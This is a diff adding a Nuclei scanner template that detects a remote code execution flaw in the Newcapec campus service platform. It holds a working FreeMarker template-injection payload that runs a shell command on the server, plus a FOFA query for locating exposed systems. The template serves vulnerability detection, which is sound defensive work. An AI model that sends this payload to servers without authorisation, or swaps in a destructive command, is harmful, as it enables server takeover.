@@ -1,0 +1,43 @@
+id: newcapec-rce
+
+info:
+  name: Newcapec - Remote Code Execution
+  author: ritikchaddha
+  severity: critical
+  description: |
+    Newcapec front-end service management platform service.action interface has a remote command execution vulnerability, attackers can use the vulnerability to obtain server permissions.
+  reference: |
+    - https://forum.butian.net/article/242
+  metadata:
+    max-request: 2
+    fofa-query: title="掌上校园服务管理平台"
+  tags: newcapec,rce,intrusive
+
+variables:
+  file: "{{rand_base(5)}}"
+  data: "{{randstr}}"
+
+http:
+  - raw:
+      - |
+        @timeout: 30s
+        POST /service_transport/service.action HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/json
+
+        {"command":"GetFZinfo","UnitCode":"<#assign ex = \"freemarker.template.utility.Execute\"?new()>${ex(\"cmd /c echo {{data}} > ./webapps/ROOT/{{file}}.txt\")}"}
+
+      - |
+        GET /{{file}}.txt HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/json
+
+    matchers:
+      - type: dsl
+        dsl:
+          - 'status_code_1 == 200 && status_code_2 == 200'
+          - 'contains(header_1, "text/plain") && contains(header_2, "text/plain")'
+          - 'contains(body_1, "{\"_result\":")'
+          - 'contains(body_2, "{{data}}")'
+        condition: and
+# digest: 490a004630440220441192072b5a29b72f55a26ec242e2966b60e3e66c70b188acafd708275860fd02207f18419d582c0da705d42e629ce364b866be4ffa42df503cc79599648888b2a2:922c64590222798bb761d5b6d8e72950
